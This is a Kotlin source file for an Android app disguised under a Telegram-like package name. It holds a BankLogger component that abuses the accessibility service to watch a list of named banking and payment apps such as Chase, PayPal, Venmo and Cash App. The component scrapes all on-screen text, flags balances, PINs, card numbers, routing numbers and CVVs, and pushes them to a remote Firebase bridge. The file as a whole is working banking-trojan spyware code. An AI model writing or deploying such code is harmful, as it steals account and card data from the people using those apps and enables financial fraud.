package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject

object BankLogger {
    private val bankPackages = setOf(
        "com.chase.sig.android",
        "com.wellsfargo.mobile",
        "com.bankofamerica.banking",
        "com.cibc.mobile",
        "com.td",
        "com.scotiabank.banking",
        "com.rbc.mobile",
        "com.capitalone.mobile",
        "com.paypal.android.p2pmobile",
        "com.venmo",
        "com.squareup.cash",
        "com.moneybookers.skrillpayments"
    )

    fun onEvent(service: AccessibilityService, event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (pkg !in bankPackages) return

        val root = service.rootInActiveWindow ?: return

        val data = JSONObject()
        data.put("package", pkg)
        data.put("activity", event.className?.toString() ?: "unknown")

        val allTexts = mutableListOf<String>()
        collectTexts(root, allTexts)
        if (allTexts.isNotEmpty()) {
            data.put("screen_texts", allTexts.joinToString(" | "))
        }

        // Flag sensitive keywords
        val keywords = listOf("balance", "PIN", "card", "account", "routing", "IBAN", "sort", "CVV")
        val sensitive = allTexts.filter { text ->
            keywords.any { text.contains(it, ignoreCase = true) }
        }
        if (sensitive.isNotEmpty()) {
            data.put("sensitive_data", sensitive.joinToString(" | "))
        }

        FirebaseBridge.pushBankData(data.toString())
    }

    private fun collectTexts(node: AccessibilityNodeInfo, out: MutableList<String>) {
        if (node.text != null && node.text.isNotBlank()) {
            out.add(node.text.toString().trim())
        }
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { collectTexts(it, out) }
        }
    }
}
